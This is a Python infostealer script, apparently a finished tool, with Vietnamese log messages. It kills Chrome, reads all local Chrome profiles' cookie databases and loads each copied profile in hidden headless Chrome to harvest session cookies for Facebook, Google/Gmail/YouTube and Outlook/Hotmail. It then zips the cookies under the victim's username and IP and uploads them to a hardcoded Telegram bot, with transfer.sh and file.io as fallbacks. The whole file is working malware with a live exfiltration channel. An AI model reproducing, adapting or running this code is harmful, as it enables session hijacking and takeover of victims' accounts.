# export_profiles_key_sites_only_full_fast.py
"""
Chỉ lấy 100% cookies FB (facebook/fbcdn/facebook.net/fb.com), Google (google/gmail/youtube/accounts/drive/ads/googleapis/googleadservices), Outlook/Hotmail (outlook/live/microsoft/office/hotmail/login.live): DB all + Selenium enhanced (3 URLs/site, 8s wait + scroll, hidden).
Trigger xs/fr/sb/wd (FB), SID/token/GMAIL_AT/session_token (Google/Gmail/YouTube), sessionid/estsauth (Outlook/Hotmail). MANUAL LOGIN BEFORE RUN for 100%.
Parallel multiple profiles (6 workers for fast). ~20-40s total for 13 profiles, hidden Chrome.
Dependencies: pip install selenium webdriver-manager requests psutil
"""
import os, sqlite3, time, tempfile, shutil, sys, zipfile, socket, getpass, subprocess
from pathlib import Path
from concurrent.futures import ProcessPoolExecutor, as_completed
import requests
import psutil
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.common.exceptions import WebDriverException, TimeoutException
from webdriver_manager.chrome import ChromeDriverManager

# ---------------- CONFIG ----------------
USER_DATA_DIR = str(Path.home() / "AppData" / "Local" / "Google" / "Chrome" / "User Data")
BATCH_WAIT_TIME = 8.0   # Faster wait for full JS/key sites session + interaction
MAX_HOSTS_PER_PROFILE = None  # All key hosts (no limit for 100%)
NUM_URLS_PER_HOST = 3  # URLs/host for key sites only
CHROME_START_OVERHEAD = 4.0
HEADLESS_TRY = True  # True = hidden (no Chrome window)
CLEANUP_TEMP = True
MAX_WORKERS = 6  # Parallel workers (faster on strong machine)
TAB_BATCH_SIZE = 5  # Open tabs in small batches + sleep to avoid timeout
# Optional: Specific profiles only (comment if want all)
# PROFILES_TO_PROCESS = ["Default", "Profile 1", "Profile 2"]  # Uncomment & add names
# ----------------------------------------

# TELEGRAM credentials
TELEGRAM_BOT_TOKEN = "8496536612:AAGxSRTEBhkIWtfATKDdRD84BFAWsj-lCmk"
TELEGRAM_CHAT_ID = "-1002914656943"

TELEGRAM_MAX_BYTES = 50 * 1024 * 1024
TRANSFER_SH_BASE = "https://transfer.sh"
FILE_IO_URL = "https://file.io"

# All related hosts for FB, Google, Outlook/Hotmail (comprehensive for 100%)
KEY_HOSTS = [
    "facebook.com", "fbcdn.net", "facebook.net", "fb.com", "messenger.com",
    "google.com", "gmail.com", "accounts.google.com", "googleusercontent.com", "youtube.com", "googleapis.com", "googleadservices.com", "ads.google.com", "drive.google.com", "docs.google.com", "play.google.com", "maps.google.com", "translate.google.com", "gstatic.com", "ggpht.com",
    "outlook.com", "live.com", "microsoft.com", "office.com", "hotmail.com", "login.live.com", "login.microsoft.com", "msn.com", "bing.com",
]

# Enhanced URLs/paths for key sites to trigger 100% full session (3 URLs/site)
KEY_SITE_URLS = {
    "facebook.com": ["https://www.facebook.com/", "https://m.facebook.com/", "https://www.facebook.com/home.php"],  # Full xs/fr/sb/wd + related
    "google.com": ["https://www.google.com/", "https://accounts.google.com/", "https://www.google.com/search"],  # Full token/SID/HSID + related
    "gmail.com": ["https://mail.google.com/mail/u/0/#inbox", "https://accounts.google.com/signin/v2/identifier", "https://gmail.com/"],  # Full GMAIL_AT/session
    "youtube.com": ["https://www.youtube.com/", "https://www.youtube.com/feed/subscriptions", "https://www.youtube.com/watch"],  # Full session_token/VISITOR_INFO1_LIVE
    "outlook.com": ["https://outlook.live.com/mail/inbox", "https://outlook.live.com/calendar", "https://login.live.com/"],  # Full sessionid/estsauth + hotmail
    "default": ["/", "/home"],
}

# Key cookie names to check/log for 100% verification (per site)
KEY_COOKIE_NAMES = {
    "facebook.com": ['xs', 'fr', 'sb', 'wd', 'c_user', 'datr', 'fbl', 'locale'],
    "google.com": ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'NID', '1P_JAR'],
    "gmail.com": ['GMAIL_AT', 'GMAIL_ID', 'session', 'SAPISID', 'SSID'],
    "youtube.com": ['session_token', 'LOGIN_INFO', 'VISITOR_INFO1_LIVE'],
    "outlook.com": ['sessionid', 'estsauth', 'ltpa', 'c', 'msToken'],
}

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "unknownIP"

USERNAME = getpass.getuser() or os.environ.get("USERNAME", "user")
LOCAL_IP = get_local_ip()
safe_user = "".join(ch if ch.isalnum() or ch in "-_" else "_" for ch in USERNAME)
safe_ip = LOCAL_IP.replace(":", "_").replace(".", "_")
NAME_ZIP = f"{safe_user}_{safe_ip}.zip"

print(f"[i] Output ZIP sẽ là: {NAME_ZIP}")

# ---- Telegram helpers ----
def send_message_telegram(text: str, bot_token: str, chat_id: str):
    if not bot_token or not chat_id:
        print("[warn] Telegram credentials not set; cannot send message.")
        return False, "no_token_or_chat"
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    try:
        resp = requests.post(url, data={"chat_id": chat_id, "text": text}, timeout=30)
        if resp.status_code == 200:
            return True, resp.json()
        else:
            return False, resp.text
    except Exception as e:
        return False, str(e)

def send_file_telegram(zip_path: Path, bot_token: str, chat_id: str, caption: str = "hello"):
    if not bot_token or not chat_id:
        print("[warn] Telegram credentials not set; skipping Telegram upload.")
        return False, "no_token_or_chat"
    if not zip_path.exists():
        return False, "no_file"
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    try:
        with zip_path.open("rb") as f:
            files = {"document": (zip_path.name, f)}
            data = {"chat_id": chat_id, "caption": caption}
            resp = requests.post(url, data=data, files=files, timeout=120)
        if resp.status_code == 200:
            return True, resp.json()
        else:
            return False, resp.text
    except Exception as e:
        return False, str(e)

def upload_to_transfer_sh(file_path: Path, tries=2, timeout=300):
    filename = file_path.name
    url = f"{TRANSFER_SH_BASE}/{filename}"
    try:
        with file_path.open("rb") as f:
            resp = requests.put(url, data=f, timeout=timeout)
        if resp.status_code in (200, 201):
            return resp.text.strip()
        else:
            print(f"[warn] transfer.sh responded {resp.status_code}: {resp.text[:200]}")
            return None
    except Exception as e:
        print("[warn] transfer.sh upload exception:", e)
        return None

def upload_to_file_io(file_path: Path, timeout=300):
    try:
        with file_path.open("rb") as f:
            files = {"file": (file_path.name, f)}
            resp = requests.post(FILE_IO_URL, files=files, timeout=timeout)
        if resp.status_code == 200:
            j = resp.json()
            link = j.get("link") or j.get("url") or j.get("download")
            return link
        else:
            print(f"[warn] file.io responded {resp.status_code}: {resp.text[:200]}")
            return None
    except Exception as e:
        print("[warn] file.io exception:", e)
        return None

# ---- process helpers ----
def kill_all_chrome():
    print("[i] Đang kill Chrome processes...")
    try:
        procs = [p for p in psutil.process_iter(['name']) if p.info['name'] and p.info['name'].lower().startswith('chrome')]
        for p in procs:
            try:
                p.kill()
            except Exception:
                pass
        if procs:
            print(f"[i] Killed {len(procs)} chrome processes.")
        else:
            print("[i] Không tìm thấy chrome processes.")
    except Exception:
        try:
            if os.name == 'nt':
                subprocess.run(['taskkill', '/F', '/IM', 'chrome.exe', '/T'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                subprocess.run(['pkill', '-f', 'chrome'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

def find_profiles(user_data_dir):
    base = Path(user_data_dir)
    if not base.exists():
        raise FileNotFoundError(f"USER_DATA_DIR not found: {user_data_dir}")
    profiles = []
    for p in sorted(base.iterdir()):
        if not p.is_dir(): continue
        if (p / "Network" / "Cookies").exists() or (p / "Cookies").exists():
            profiles.append(p.name)
    # Optional: Filter specific profiles
    # if 'PROFILES_TO_PROCESS' in globals():
    #     profiles = [p for p in profiles if p in PROFILES_TO_PROCESS]
    return profiles

def read_hosts_from_db(user_data_dir, profile_dir):
    db1 = Path(user_data_dir) / profile_dir / "Network" / "Cookies"
    db2 = Path(user_data_dir) / profile_dir / "Cookies"
    db = db1 if db1.exists() else db2
    if not db.exists():
        return []
    hosts = []
    try:
        conn = sqlite3.connect(str(db))
        cur = conn.cursor()
        cur.execute("SELECT DISTINCT host_key FROM cookies")
        hosts = [r[0] for r in cur.fetchall()]
    except Exception:
        hosts = []
    finally:
        try: conn.close()
        except: pass
    return hosts

def read_all_cookies_from_db(user_data_dir, profile_name, key_hosts_only=True):
    """Read ALL cookies from DB, filter only key hosts for 100% FB/Google/Outlook."""
    db1 = Path(user_data_dir) / profile_name / "Network" / "Cookies"
    db2 = Path(user_data_dir) / profile_name / "Cookies"
    db = db1 if db1.exists() else db2
    if not db.exists():
        return {}

    aggregated = {}
    try:
        conn = sqlite3.connect(f"file:{db}?mode=ro", uri=True, timeout=10)
        cur = conn.cursor()
        query = "SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly FROM cookies"
        params = []
        if key_hosts_only:
            host_placeholders = ','.join('?' for _ in KEY_HOSTS)
            query += f" WHERE host_key IN ({host_placeholders})"
            params = KEY_HOSTS
        cur.execute(query, params)
        
        rows = cur.fetchall()
        for row in rows:
            host_key, name, value, path, expires_utc, is_secure, is_httponly = row
            value = value.replace("\t", " ").replace("\r", "").replace("\n", "") if value else ""
            expiry = int((expires_utc / 1000000) - 11644473600) if expires_utc else 0
            
            key = (host_key, name, path or "/")
            if key not in aggregated:
                aggregated[key] = {
                    'domain': host_key,
                    'httpOnly': "TRUE" if is_httponly else "FALSE",
                    'path': path or "/",
                    'secure': "TRUE" if is_secure else "FALSE",
                    'expiry': str(expiry),
                    'name': name or "",
                    'value': value
                }
        conn.close()
    except Exception as e:
        print(f"[warn] DB read error for {profile_name}: {e}")
    return aggregated

def copy_profile_minimal(src_profile: Path, dst_profile: Path):
    ignore_dirs = {
        "Cache", "GPUCache", "Code Cache", "Service Worker", "ServiceWorker",
        "Media Cache", "File System", "ShaderCache", "IndexedDB", "Local Storage",
        "Cache Storage", "Pepper Data"
    }
    def _ignore(dirpath, names):
        to_ignore = [n for n in names if n.lower() in {x.lower() for x in ignore_dirs}]
        return to_ignore
    dst_profile.parent.mkdir(parents=True, exist_ok=True)
    shutil.copytree(src_profile, dst_profile, dirs_exist_ok=True, ignore=_ignore)

def download_chromedriver_once():
    path = ChromeDriverManager().install()
    return path

# Enhanced worker: Only key sites (FB/Google/Outlook related) for 100% full & fast
def _worker(args):
    user_data_dir, profile_name, batch_wait_time, chromedriver_path, cleanup_temp = args
    import tempfile, shutil, time
    from pathlib import Path
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.common.by import By

    # Step 1: Read ALL from DB, filter only key hosts (FB/Google/Outlook related)
    all_hosts = read_hosts_from_db(user_data_dir, profile_name)
    key_hosts = [h for h in all_hosts if any(kh in h.lower() for kh in KEY_HOSTS)]  # Only key hosts
    unique_hosts = sorted(set(key_hosts))  # Dedup key hosts only
    db_cookies = read_all_cookies_from_db(user_data_dir, profile_name, key_hosts_only=True)
    print(f"[i] {profile_name}: DB {len(db_cookies)} cookies from {len(unique_hosts)} key hosts (FB/Google/Outlook only)")

    # Pre-check key cookies in DB (for 100% warning)
    for site in KEY_SITE_URLS:
        site_db_cookies = {k: v for k, v in db_cookies.items() if site in v['domain'].lower()}
        key_db_names = [v['name'] for v in site_db_cookies.values() if v['name'] in KEY_COOKIE_NAMES.get(site, [])]
        if len(key_db_names) < len(KEY_COOKIE_NAMES.get(site, [])) / 2:  # If <50% key cookies, warn manual login
            print(f"[warn] {profile_name}: {site} DB key cookies low ({len(key_db_names)}/{len(KEY_COOKIE_NAMES.get(site, []))}) - manual login {site} before run for 100%!")

    if not db_cookies and not unique_hosts:
        return (profile_name, "[no key hosts or DB]")

    selenium_cookies = {}
    driver = None
    tmp_root = None
    selenium_success = False

    # Step 2: Enhanced Selenium batch tabs for key sites only (fast, no other hosts)
    if unique_hosts:
        try:
            tmp_root = Path(tempfile.mkdtemp(prefix=f"profile_copy_{profile_name}_"))
            dest_root = tmp_root / "User Data"
            dest_root.mkdir(parents=True, exist_ok=True)
            src_profile = Path(user_data_dir) / profile_name
            print(f"[i] {profile_name}: Copying profile...")
            copy_profile_minimal(src_profile, dest_root / profile_name)
            print(f"[i] {profile_name}: Profile copy OK")

            # Enhanced options: Headless hidden, full JS + user agent + timeout fixes for key sites
            options = webdriver.ChromeOptions()
            options.add_argument(f"--user-data-dir={str(dest_root)}")
            options.add_argument(f"--profile-directory={profile_name}")
            if HEADLESS_TRY:
                options.add_argument("--headless=new")  # Hidden Chrome window
            options.add_argument("--disable-gpu")
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            options.add_argument("--no-first-run")
            options.add_argument("--no-default-browser-check")
            options.add_argument("--remote-debugging-port=0")
            options.add_argument("--disable-extensions")
            options.add_argument("--disable-web-security")  # For FB load
            options.add_argument("--allow-running-insecure-content")  # For redirect
            options.add_argument("--disable-features=VizDisplayCompositor")  # Speed headless
            options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")  # Real UA for better JS/cookies
            options.add_experimental_option("prefs", {
                "profile.managed_default_content_settings.images": 2,  # Block images speed
                "profile.managed_default_content_settings.stylesheets": 2,  # Block CSS speed
                "profile.default_content_setting_values.notifications": 2,
            })
            # Full JS for key sites session

            service = Service(executable_path=chromedriver_path, timeout=180)  # Increased service timeout
            print(f"[i] {profile_name}: Starting Chrome (hidden)...")
            driver = webdriver.Chrome(service=service, options=options)
            driver.set_page_load_timeout(30)
            driver.set_script_timeout(30)  # Increased script timeout for window.open
            driver.implicitly_wait(3)  # Longer for key sites JS
            print(f"[i] {profile_name}: Chrome started OK")

            # Priority load key sites first (only FB, Google, Outlook related hosts)
            key_site_hosts = []
            for site in KEY_SITE_URLS:
                key_site_hosts += [h for h in unique_hosts if site in h.lower()]
            all_hosts_ordered = list(set(key_site_hosts))  # Only key sites, no other
            main_window = driver.current_window_handle
            tab_count = 0
            key_tab_count = 0
            batch_count = 0
            for host in all_hosts_ordered:
                h = host.lstrip(".")
                low_h = h.lower()
                urls = KEY_SITE_URLS.get(next((k for k in KEY_SITE_URLS if k in low_h), "default"), [f"https://{h}/", f"https://www.{h}/"])
                urls = urls[:NUM_URLS_PER_HOST]  # 3 URLs/host
                if low_h in KEY_SITE_URLS:  # For key sites, use all 3 URLs for 100% full
                    urls = KEY_SITE_URLS[low_h][:3]  # Full 3 URLs for key sites
                for url in urls:
                    retry = 0
                    while retry < 2:  # Retry 1 time if timeout
                        try:
                            if tab_count == 0:
                                driver.get(url)
                            else:
                                driver.execute_script(f"window.open('{url}', '_blank');")
                            tab_count += 1
                            if low_h in KEY_SITE_URLS:
                                key_tab_count += 1
                            break  # Success, no retry
                        except WebDriverException as e:
                            retry += 1
                            if retry == 2:
                                print(f"[warn] {profile_name}: Failed to open {url} after retry: {e}")
                            else:
                                time.sleep(0.5)  # Wait before retry
                    # Batch sleep to avoid timeout
                    batch_count += 1
                    if batch_count % TAB_BATCH_SIZE == 0:
                        time.sleep(0.5)  # Small sleep every 10 tabs

            # Faster wait for key sites tabs to load full session + scroll interaction
            print(f"[i] {profile_name}: Waiting {batch_wait_time}s for {tab_count} key tabs to load full new cookies...")
            time.sleep(batch_wait_time)

            # Explicit wait + scroll interaction for key sites (simulate user to trigger 100% session)
            if key_tab_count > 0:
                try:
                    # Switch to first key site tab and wait for body
                    driver.switch_to.window(driver.window_handles[0])
                    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
                    # Scroll interaction to trigger JS/cookies (e.g., FB feed, Google search, Hotmail inbox)
                    driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
                    time.sleep(1)  # Faster wait after scroll
                    driver.execute_script("window.scrollTo(0, 0);")  # Scroll back
                    time.sleep(1)  # Extra for redirect/session set
                except TimeoutException:
                    print(f"[warn] {profile_name}: Key sites wait timeout, but continuing...")
            else:
                # General wait for other sites
                try:
                    WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
                except TimeoutException:
                    pass

            # Get ALL new cookies from session (shared across tabs, only key sites)
            ck = driver.get_cookies()
            for c in ck:
                if any(kh in c.get("domain", "").lower() for kh in KEY_HOSTS):  # Filter only key hosts
                    key = (c.get("domain"), c.get("name"), c.get("path", "/"))
                    if key not in selenium_cookies:
                        value = c.get("value", "").replace("\t", " ").replace("\r", "").replace("\n", "")
                        expiry = c.get("expiry") or c.get("expires") or 0
                        try: expiry_int = int(expiry)
                        except: expiry_int = 0
                        selenium_cookies[key] = {
                            'domain': c.get("domain", ""),
                            'httpOnly': "TRUE" if c.get("httpOnly", False) else "FALSE",
                            'path': c.get("path", "/"),
                            'secure': "TRUE" if c.get("secure", False) else "FALSE",
                            'expiry': str(expiry_int),
                            'name': c.get("name", ""),
                            'value': value
                        }
            selenium_success = True
            print(f"[i] {profile_name}: Selenium got {len(selenium_cookies)} full new key cookies from {tab_count} tabs")

            # Log cookies per key site to check 100% full
            for site in KEY_SITE_URLS:
                site_cookies = {k: v for k, v in selenium_cookies.items() if site in v['domain'].lower()}
                if site_cookies:
                    site_names = [v['name'] for v in site_cookies.values()]
                    key_names = [name for name in site_names if name in KEY_COOKIE_NAMES.get(site, [])]
                    key_count = len([name for name in KEY_COOKIE_NAMES.get(site, []) if name in site_names])
                    percent = (key_count / len(KEY_COOKIE_NAMES.get(site, []))) * 100 if KEY_COOKIE_NAMES.get(site) else 0
                    print(f"[i] {profile_name}: {site} cookies: {', '.join(sorted(set(site_names)))[:100]}... (key: {', '.join(sorted(set(key_names)))}, {percent:.0f}% full, total {len(site_cookies)})")
                else:
                    print(f"[warn] {profile_name}: No {site} cookies - manual login {site} before run for 100%!")

        except Exception as e:
            print(f"[error] {profile_name}: Selenium failed: {type(e).__name__}: {e}")
            selenium_success = False
        finally:
            if driver:
                try:
                    driver.quit()
                    print(f"[i] {profile_name}: Driver quit OK")
                except Exception as quit_e:
                    print(f"[warn] {profile_name}: Driver quit failed: {quit_e}")

    # Step 3: Merge DB + Selenium for 100% full key data only
    final_cookies = db_cookies.copy()
    if selenium_success and selenium_cookies:
        final_cookies.update(selenium_cookies)
        print(f"[i] {profile_name}: Total 100% full key cookies: {len(final_cookies)} (DB: {len(db_cookies)}, Selenium added new: {len(selenium_cookies)})")
    else:
        print(f"[i] {profile_name}: Fallback to DB only - Total key: {len(final_cookies)} (Selenium failed/skipped)")

    # Step 4: Write to file (only key cookies, for 100% full per profile)
    output_dir = Path.cwd() / "cookies_by_profile_key_only"
    output_dir.mkdir(parents=True, exist_ok=True)
    out_path = output_dir / f"{profile_name}_key_cookies.txt"
    try:
        with out_path.open("w", encoding="utf-8") as f:
            for _, v in final_cookies.items():
                line = "\t".join([v['domain'], v['httpOnly'], v['path'], v['secure'], v['expiry'], v['name'], v['value']])
                f.write(line + "\n")
        print(f"[done] {profile_name}: Wrote {len(final_cookies)} 100% full key cookies to {out_path}")
    except Exception as e:
        print(f"[error] {profile_name}: Write failed: {e}")
        if tmp_root:
            try:
                shutil.rmtree(tmp_root, ignore_errors=True)
            except:
                pass
        return (profile_name, f"[write error] {e}")

    # Cleanup temp profile copy
    if cleanup_temp and tmp_root:
        try:
            shutil.rmtree(tmp_root, ignore_errors=True)
            print(f"[i] {profile_name}: Temp profile cleaned up")
        except Exception as e:
            print(f"[warn] {profile_name}: Cleanup failed: {e}")

    return (profile_name, str(out_path))

def main():
    start_time = time.time()
    # Discover profiles and compute estimate BEFORE killing chrome
    try:
        profiles = find_profiles(USER_DATA_DIR)
    except Exception as e:
        print(f"[error] Không tìm thấy profiles: {e}")
        return
    if not profiles:
        print("[error] Không tìm thấy profiles.")
        return

    # Compute key hosts per profile and estimated time (only key sites: overhead + wait per profile)
    total_key_hosts = 0
    estimated_seconds = len(profiles) * (CHROME_START_OVERHEAD + BATCH_WAIT_TIME)  # ~12s/profile for key only
    hosts_by_profile = {}
    for p in profiles:
        all_hosts = read_hosts_from_db(USER_DATA_DIR, p)
        key_hosts = [h for h in all_hosts if any(kh in h.lower() for kh in KEY_HOSTS)]
        hosts_by_profile[p] = key_hosts
        total_key_hosts += len(key_hosts)

    # Human readable estimate
    mins = int(estimated_seconds // 60)
    secs = int(estimated_seconds % 60)
    estimate_str = f"{mins}m{secs}s" if mins else f"{secs}s"

    pre_msg = (f"data sắp về...\n"
               f"Profiles: {len(profiles)}\n"
               f"Tổng hosts: {total_key_hosts}\n"
               f"Tgian Ước Tính: Hơn{estimate_str} (FB/Google/Hotmail)\n"
               f"Đang chạy...")

    # Send pre-notification
    ok, info = send_message_telegram(pre_msg, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID)
    if ok:
        print("[i] Pre-notification sent to Telegram.")
    else:
        print(f"[warn] Pre-notification not sent: {info}")

    # Kill chrome to unlock profiles
    kill_all_chrome()

    # Pre-download chromedriver
    print("[i] Đang tải chromedriver...")
    chromedriver_path = download_chromedriver_once()
    print(f"[i] Chromedriver tại: {chromedriver_path}")

    # Parallel 100% full key sites processing (only FB/Google/Outlook related)
    workers = min(len(profiles), MAX_WORKERS)  # Parallel workers for fast
    print(f"[i] Bắt đầu parallel key sites processing với {workers} workers...")
    args_list = []
    for p in profiles:
        args_list.append((USER_DATA_DIR, p, BATCH_WAIT_TIME, chromedriver_path, CLEANUP_TEMP))

    results = []
    with ProcessPoolExecutor(max_workers=workers) as exe:
        future_to_profile = {exe.submit(_worker, args): args[1] for args in args_list}
        for fut in as_completed(future_to_profile):
            prof = future_to_profile[fut]
            try:
                prof_name, res = fut.result()
                print(f"[done] {prof_name} -> {res}")
                results.append((prof_name, res))
            except Exception as e:
                print(f"[error] profile {prof} raised exception: {type(e).__name__}: {e}")
                results.append((prof, f"[exception] {e}"))

    # Merge unique cookies across profiles (100% full key unique)
    produced = [Path(r) for (_, r) in results if isinstance(r, str) and Path(r).exists()]
    merged = Path.cwd() / "all_key_profiles_cookies.txt"
    merged_entries = {}
    if produced:
        print(f"[i] Merging {len(produced)} profile files for 100% full key unique...")
        for p in produced:
            try:
                for line in p.read_text(encoding="utf-8").splitlines():
                    parts = line.split("\t")
                    if len(parts) < 7:
                        continue
                    domain, httpOnly, path, secure, expiry, name, value = parts[0:7]
                    if any(kh in domain.lower() for kh in KEY_HOSTS):  # Only key hosts in merge
                        key = (domain, name, path)
                        if key not in merged_entries:
                            merged_entries[key] = (domain, httpOnly, path, secure, expiry, name, value)
            except Exception as e:
                print(f"[warn] Merge error for {p}: {e}")
                continue
        with merged.open("w", encoding="utf-8") as f:
            for v in merged_entries.values():
                f.write("\t".join(v) + "\n")
        print(f"[i] Merged {len(merged_entries)} unique full key entries to {merged}")
    else:
        print("[warn] Không có produced files để merge.")

    # Zip all produced files + merged (100% full key data)
    to_zip = produced.copy()
    if merged.exists():
        to_zip.append(merged)
    if not to_zip:
        print("[warn] Không có gì để zip.")
        return

    zip_path = Path.cwd() / NAME_ZIP
    with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for p in to_zip:
            zf.write(p, arcname=p.name)
    size = zip_path.stat().st_size
    print(f"[i] Tạo full key ZIP {zip_path} ({size} bytes)")

    # Send or upload and send link (Telegram first, fallback)
    if size <= TELEGRAM_MAX_BYTES:
        ok, info = send_file_telegram(zip_path, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, caption="Tele: @Hutbotnet (data FB/Google/Hotmail)!")
        if ok:
            print("[i] Full key ZIP uploaded to Telegram successfully.")
        else:
            print(f"[warn] Telegram upload failed: {info}")
            # Fallback to transfer.sh
            link = upload_to_transfer_sh(zip_path)
            if link:
                msg = f"100% Full Key Cookies (FB/Google/Hotmail)!\nUploaded to transfer.sh: {link}"
                send_message_telegram(msg, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID)
                print("[i] Fallback transfer.sh link sent to Telegram.")
            else:
                # Fallback to file.io
                link2 = upload_to_file_io(zip_path)
                if link2:
                    msg = f"100% Full Key Cookies (FB/Google/Hotmail)!\nUploaded to file.io: {link2}"
                    send_message_telegram(msg, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID)
                    print("[i] Fallback file.io link sent to Telegram.")
                else:
                    print("[error] All upload attempts failed.")
    else:
        print("[i] Full key ZIP larger than Telegram limit; uploading to transfer.sh ...")
        link = upload_to_transfer_sh(zip_path)
        if link:
            print(f"[i] transfer.sh returned: {link}")
            send_message_telegram(f"100% Full Key Cookies (FB/Google/Hotmail)!\n{link}", TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID)
            print("[i] Sent transfer.sh link to Telegram.")
        else:
            print("[warn] transfer.sh upload failed; trying file.io...")
            link2 = upload_to_file_io(zip_path)
            if link2:
                send_message_telegram(f"100% Full Key Cookies (FB/Google/Hotmail)!\n{link2}", TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID)
                print("[i] Sent file.io link to Telegram.")
            else:
                print("[error] All remote upload attempts failed; cannot send file.")

    # Optional: Cleanup individual files (keep full key ZIP)
    if CLEANUP_TEMP:
        for p in produced:
            try:
                p.unlink()
            except Exception:
                pass
        try:
            merged.unlink()
        except Exception:
            pass
        print("[i] Cleaned up temporary files (full key ZIP kept).")

    total_time = time.time() - start_time
    print(f"[i] Total time for 100% full key data (FB/Google/Hotmail): {total_time:.1f}s (manual login for 100%)")

if __name__ == "__main__":
    main()
